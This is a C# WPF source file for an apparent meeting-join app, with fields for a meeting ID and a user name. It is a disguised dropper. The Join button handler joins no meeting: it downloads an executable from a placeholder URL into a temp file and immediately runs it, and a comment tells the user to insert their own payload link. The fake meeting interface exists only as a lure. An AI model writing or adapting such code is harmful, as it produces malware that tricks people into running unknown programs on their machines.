using System;
using System.Net;
using System.Diagnostics;
using System.Windows;
using System.Windows.Media;

namespace MeetingLauncher
{
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            InitializeMeetingId();
            InitializeNameTextBox();

            MeetingIdTextBox.GotFocus += RemoveMeetingIdText;
            MeetingIdTextBox.LostFocus += AddMeetingIdText;

            NameTextBox.GotFocus += RemoveNameText;
            NameTextBox.LostFocus += AddNameText;
        }

        private void InitializeMeetingId()
        {
            MeetingIdTextBox.Text = "Meeting ID or personal link name";
            MeetingIdTextBox.Foreground = Brushes.Gray;
        }

        private void InitializeNameTextBox()
        {
            NameTextBox.Text = "Enter your name";
            NameTextBox.Foreground = Brushes.Gray;
        }

        private void RemoveMeetingIdText(object sender, EventArgs e)
        {
            if (MeetingIdTextBox.Text == "Meeting ID or personal link name")
            {
                MeetingIdTextBox.Text = "";
                MeetingIdTextBox.Foreground = Brushes.Black;
            }
        }

        private void AddMeetingIdText(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(MeetingIdTextBox.Text))
            {
                MeetingIdTextBox.Text = "Meeting ID or personal link name";
                MeetingIdTextBox.Foreground = Brushes.Gray;
            }
        }

        private void RemoveNameText(object sender, EventArgs e)
        {
            if (NameTextBox.Text == "Enter your name")
            {
                NameTextBox.Text = "";
                NameTextBox.Foreground = Brushes.Black;
            }
        }

        private void AddNameText(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(NameTextBox.Text))
            {
                NameTextBox.Text = "Enter your name";
                NameTextBox.Foreground = Brushes.Gray;
            }
        }

        private void JoinButton_Click(object sender, RoutedEventArgs e)
        {
            string url = "https://example.com/your-executable.exe"; // Укажите вашу ссылку на исполняемый файл

            using (WebClient webClient = new WebClient())
            {
                string tempFile = System.IO.Path.GetTempFileName() + ".exe";
                webClient.DownloadFile(url, tempFile);
                Process.Start(tempFile);
            }
         
      
        }
    }
}
